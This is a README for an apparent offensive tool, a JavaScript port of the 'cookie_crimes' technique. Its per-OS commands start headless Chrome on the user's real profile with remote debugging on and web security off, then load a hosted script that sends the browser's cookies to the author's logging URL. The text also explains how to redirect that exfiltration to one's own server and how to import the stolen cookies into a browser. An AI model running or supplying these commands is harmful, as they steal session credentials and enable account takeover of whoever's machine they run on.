This is a javascript implementation of the [cookie_crimes tool](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password) by @mangopdf

Running the command below will run the javascript found in the *index.html* file of this repo which has been setup using Github Pages. It is currently hardcoded to post the script output (your sensitve cookies) to my own loggly.com URL. You should host it on your own server and modify the location where the cookies get sent.

Use "Edit this Cookie" chrome extension to paste the JSON formatted cookies right into your browser.

Thank you to @shellsterdude for introducing me to cookie_crimes and for the hints, tips and help testing he gave along the way.

Note: Running this command leaves a headless browser behind, causing non-deterministic results if you run it again. You should kill the chrome processes associated with the headless browser or restart the OS before running this command a second time to guarantee your successfull exfil of cookies.

# Windows

## Windows 10

### 64 Bit

```"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/```

### 32 Bit

```"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/```

## Windows 7

```"%localAppData%\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="%localAppData%/Google/Chrome/User Data" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/```

# OS X

```"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="$HOME/Library/Application Support/Google/Chrome" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/```

# Linux

```google-chrome --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="~/.config/google-chrome/default" --disable-plugins https://clr2of8.github.io/CookieCrimesJS/```
